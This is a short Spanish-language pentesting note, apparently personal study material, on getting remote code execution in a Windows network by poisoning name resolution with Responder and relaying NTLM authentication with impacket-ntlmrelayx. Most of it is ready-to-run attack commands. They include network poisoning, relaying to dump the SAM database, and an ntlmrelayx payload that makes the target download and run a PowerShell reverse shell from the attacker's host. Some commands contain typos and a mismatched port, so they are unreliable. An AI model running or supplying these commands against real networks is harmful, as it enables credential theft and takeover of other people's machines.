Teniendo un usuario con privilegios de administrador y podemos mediante SAMBA ejecutar codigo remoto en los equipos donde este tiene privilegios utilizando responder y ntlmrelay

Pasos 1 
En el responder debemos ir a la configuracion y poner en off en la seccion Server Start a SMB y a HTTP para que no entre en conflicto con ntlmrelay
Ponemos al responder a envenenar la red

```
[alex@parrot]─[/usr/share/responder]
└──╼ $sudo python3 Responder.py -I ens33 -dw
```

Paso 2 
Levantar el ntlmrelay para que escuche lo que nos va a mandar el responder que utilizara las cuentas que se intentan autenticar en la red para acceder a los recursos si estas cuentas tiene privilegio de administración podremos obtener lo que hay en la SAM del equipo incluso ejecutar comandos mediante samba

```
sudo impacket-ntlmrelayx -tf target -smb2support
```

Inyectar comandos Inyectaremos una reverse shell de powershell

Este comando lo que hará sera ejecutar en la maquina objetivo una sentencia de power-shell para que ejecute un script que tenemos en nuestra maquina que crea una reverse shell con nuestro equipo.
En nuestro equipo tendremos que estar escuchando por el puerto al cual queremos conectar y ademas debemos tener un servidor levantado para que se haga la petición a este

```
nc -lnvp 443

python3 -m server 

#En la carpeta donde esta el archivo que contiene el script de povershell en nuestro caso PS.ps1 que contiene una funcion para crear reverse shells y al final lo ejecutamos para al leer ejecute el comando

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.11.10 -Port 4444

```

Ejecutamos nuestro Ntlmrelay con la ejecucion de la peticion a nuestro servidor de python 
```
sudo impacket-ntlmrelayx -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient ).downloadString( 'http://192.168.94.128:8000/PS.psi|')"
```

Guia Visual 
![](../../../attachments/images/Diagrama%20visual.png)
